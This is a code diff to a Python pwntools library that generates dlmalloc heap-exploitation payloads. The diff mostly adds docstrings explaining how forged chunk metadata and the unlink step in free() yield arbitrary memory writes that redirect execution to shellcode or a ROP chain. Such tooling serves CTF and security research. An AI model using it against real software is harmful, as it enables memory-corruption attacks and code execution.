@@ -1,26 +1,46 @@
 
 from pwn import *
 
-"""
-Dlmalloc Terminology :
-    Chunk whose metadata is being overwritten and later freed     :    "C"
-    Chunk that is 'before' C(crafted block); "C - PREV_SIZE_C"    :    "BEFORE_C"
-    Chunk that is 'after'  C(crafted block)  "C + SIZE_C"         :    "AFTER_C"
-"""
-
 class HeaplibException(Exception):
     pass
 
 class DlmallocPayloadCrafter(object):
     """
     Class that assists with generating payloads for Dlmalloc exploitation.
+
+    "C" refers to the chunk whose metadata is overwritten with user input
+    and is subsequently freed.
+
+    "AFTER_C" refers to the chunk that free() thinks is the chunk after "C".
+    free() finds AFTER_C as "C + SIZE_C".
+
+    "BEFORE_C" refers to the chunk that free() thinks is the chunk before "C".
+    free() finds BEFORE_C as "C - PREV_SIZE_C".
+
+    The class returns 3 values :
+        - prev       :   The string to be placed before the metadata of "C".
+        - metadata   :   A 2-tuple value that will be used to overwrite the
+                         metadata of "C".
+        - post       :   The string to be placed after the metadta of "C".
     """
+
     def __init__(self, destination, source, **kw):
         """
         destination    :   Address to which `source` must be written out to.
+
         source         :   Address of your shellcode/ROP chain. Note that *(source+8)
-                           must be writable
-        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
+                           must be writable.
+
+        pre_length     :   Length of the string, after which you can overflow into the
+                           metadata of "C".
+
+        post_length    :   Amount of space you have available after the metadata of "C".
+
+        pre_preset     :   Preset values that you need at certain offsets in the `prev`
+                           string that will be generated and returned by `generate_payload`.
+
+        post_preset    :   Preset values that you need at certain offsets in the `post`
+                           string that will be generated and returned by `generate_payload`.
         """
         self.destination          = destination
         self.source               = source
@@ -36,9 +56,18 @@ class DlmallocPayloadCrafter(object):
         self.size                 = kw.get("size", context.bits/8)
 
     def can_use(self, content, start, length):
+        """
+        Given a segment of an array described as `content[start: start+length]` determine
+        if the segment can be used to place crafted frames, or not(as they may contain
+        preset values).
+        """
         return content[start: start+length] == [self.populating_character] * length
 
     def populate_content(self, **kw):
+        """
+        Given a `length`, and a set of `presets` values, create a list of size `length`,
+        apply the presets, and return the list.
+        """
         presets = kw.get("presets", None)
         length = kw.get("length", None)
 
@@ -60,6 +89,9 @@ class DlmallocPayloadCrafter(object):
 
     def find_usable_offset(self, i, full_list, unit_len, values_list, total_length, backward=True):
         """
+        A helper function that finds the a contiguous segment in `full_list` that can be
+        used to place fake frames.
+
         Arguments:
             i               : start index to check from
             full_list       : the list to examine values of
@@ -105,6 +137,19 @@ class DlmallocPayloadCrafter(object):
         """
         Generate the payload that will be used to perform arbitrary memory
         writes during unlink.
+
+        This method returns 3 values.
+        - prev      :  a list of values of length `self.prev_length` that can be used
+                       to get to the metadata of "C".
+        - metadata  :  a tuple with two values that are used to overwrite the PREV_SIZE
+                       and the size field of "C".
+        - post      :  a list of values of length `self.post_length` that can be placed
+                       after "C".
+
+        Currently, the library assumes that null bytes cannot be used in the payload.
+        As null bytes cannot be used in the payload, PREV_SIZE_C and SIZE_C will need to be
+        set to small negative values. As a result, AFTER_C will be present in `prev`
+        and BEFORE_C will be present in `post`.
         """
 
         prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
@@ -173,12 +218,3 @@ class HeapPayloadCrafter(object):
     def generate_payload(self):
         return self.payload_crafter.generate_payload()
 
-
-"""
-# TODO support for overwriting using forward consolidation
-# TODO support for overwriting using forward consolidation only
-# TODO edgecase that metadata's prevsize can be used as size => DONE
-# TODO add support for arch 32 and 64   => DONE
-# TODO support for overwriting using frontlink method
-# TODO what if we can overwrite ONLY the metadata of C
-"""
